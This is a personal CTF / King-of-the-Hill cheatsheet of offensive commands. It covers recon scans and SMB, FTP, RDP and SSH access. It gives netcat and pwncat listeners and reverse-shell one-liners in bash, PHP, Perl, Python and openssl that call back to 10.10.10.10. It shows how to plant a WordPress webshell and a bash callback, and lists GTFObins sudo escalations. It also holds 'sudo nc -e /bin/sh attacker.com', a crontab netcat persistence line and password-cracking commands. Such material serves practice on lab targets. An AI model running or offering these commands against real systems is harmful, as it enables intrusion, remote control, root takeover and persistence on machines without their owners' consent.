<h1>PFORM - CTF / KOTH - Cheatsheet</h1>

<h2>Change IP on all scripts in a folder</h2>

If you like me have a folders with reverse-shells and scripts for your CTF / Koth needs,

and your IP changes just before the game starts, and no script have the correct ip.

<b>pform@attacker~: </b><code>cd ~/super-ninja-scripts/</code>

<b>pform@attacker~script-folder/:<code> grep -rl 10.10.10.10 * | xargs sed -i 's/10.10.10.10/20.20.20.20/g'</code>

<b>In this example 10.10.10.10 is the old-ip and 20.20.20.20 is the new-ip.</b>

<h2>RECON</h2> 

<b>pform@attacker~: </b><code>rustscan -A 10.10.10.10</code>

<b>pform@attacker~: </b><code>sudo nmap -Pn -sV -sC -oN nmap.log 10.10.10.10</code>

<b>pform@attacker~: </b><code>gobuster -dir -e php,html,htm,txt,log,conf,flag -u http://10.10.10.10 -w /usr/share/wordlists/directory-list-2.3-medium.txt</code>

<b>pform@attacker~: </b><code>nikto -Display 1234EP -o report.html -Format htm -Tuning 123bde -host 10.10.10.10</code>

<h2>SMB</h2>

<b>pform@attacker~: </b><code>smbmap -H 10.10.10.10</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10</code>

<b>pform@attacker~: </b><code>smbclient -L \\\\10.10.10.10\\C$ -U guest -W WORKGROUP</code>

<b>Download :</b> get

<b>Upload :</b> put

<b>Read files :</b> more 



<h2>FTP</h2>

Is the host vuln to anonymous login?

<b>pform@attacker~: </b><code>ftp 10.10.10.10</code>

<b>pform@attacker~: </b>Login: <code>anonymous</code> Password: <code>anonymous</code>

Dont forget to check for hidden directories like this:

<b>pform@attacker~: </b><code>ls -la</code>

drwxr-xr-x pform pform 0069 Dec 32 00:00 .

drwxr-xr-x pform pform 0069 Dec 32 20:00 ..

drwxr-xr-x pform pform 0069 Dec 32 00:00 ... <b>     < - - - - - - - - - - - - ( 3 dots )</b>

-rw-r--r-x pform pform 0069 Dec 32 00:00 random-stuff.txt


<h2>RDP</h2>

I think remmina is slow, compared to xfreerdp. 

<b>+clipboard</b> makes it possible to copy from <b>attacker machine</b> to <b>victim machine</b>

<b>pform@attacker~: </b><code>xfreerdp +clipboard +window-drag /u:username /p:password /v:10.10.10.10</code>

<h2>SSH</h2>

<b>pform@attacker~: </b><code>ssh user@10.10.10.10 -p 22</code>

<b>pform@attacker~: </b><code>ssh -i id_rsa user@10.10.10.10 -p 22</code>


<h1>Listners</1>

<h2>NETCAT</h2>

<b>pform@attacker~: </b><code>nc -lnvp 5555</code>

<h2>PWNCAT</h2>

<code>git clone https://github.com/calebstewart/pwncat.git; cd pwncat</code>

<b>pform@attacker~: </b><code>pwncat -l -p 5555</code>
  
I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:

<b>pform@local~: </b><code>download /etc/passwd</code>

<b>pform@local~: </b><code>upload ~/super-ninja-scripts/hightech-privesc-0day.py</code>

Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.


<h1>Revers-Shell</h1>

Pentestmonkey <li>http://pentestmonkey.net/</li>

<h2>Bash</h2>

/bin/bash -i >& /dev/tcp/10.10.10.10/5555

/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'

 Wordpress example 1.
 
+-------------------+

After logging in to the admin panel open the Plugin editor, in the bottom of a plugin.

Add <code>/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1'</code>

 Wordpress example 2.
 
+-------------------+

Edit "header.php"

Under php tag

<code>echo system($ REQUESTS['cmd']);</code>

change request metod by left click

open upp burp and run command in the bottom of the page:

<code>cmd=whomai</code>

<code>cmd=/bin/bash -i >& /dev/tcp/10.10.10.10/5555 0>&1</code>

<h2>PHP</h2>

php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'

<h2>Perl</h2>

perl -e 'use Socket;$i="10.10.10.10";$p=5555;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
  
<h2>Python</h2>

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

<h2>mkfifo</h2>

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.10.10.10:5555 > /tmp/s 2> /dev/null; rm /tmp/s



<h1>Privesc</h1>

<h2>Search programs to privesc</h2>
<b>sudo -l</b> lists all commands your USER can use with SUDO permissions
if user dont have premisions try:

Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</li>

LinEnum <li>https://github.com/rebootuser/LinEnum</li>

<b>pform@attacker~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>



GTFObins <li>https://gtfobins.github.io/</li>


<h2>GTFObins</h2>

vim 
<code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)

nmap
<code>sudo nmap --interactive</code> followed by <code>!sh</code>

iftop
<code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>

find
<code>sudo find . -exec /bin/sh \; -quit</code>

nano
<code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file

man
<code>sudo man</code>followed by <code>!/bin/sh</code>

awk
<code>sudo awk 'BEGIN {system("/bin/sh")}'</code>

less
<code>sudo less /etc/profile followed by !/bin/sh</code>

<code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)

ftp
<code>sudo ftp</code>followed by <code>!/bin/sh</code>

more
<code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>

nc

If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Run <code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.

RHOST=attacker.com

RPORT=5555

sudo nc -e /bin/sh $RHOST $RPORT

------

add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>


<h1>SPAWN BASH SHELL</h1>

<b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>

<b>From sh to bash</b<code>python -c 'import pty;pty.spawn("/bin/bash")'</code>


<h1>Stabalize your shell<h1>


<h1>Password Cracking</h1>

<b>ZIP</b>

<code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>

<b>or</b>

<code>zip2john zip.zip > zip.hash</code>

<code>john --format=PKZIP ziphash.txt</code>

<code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>

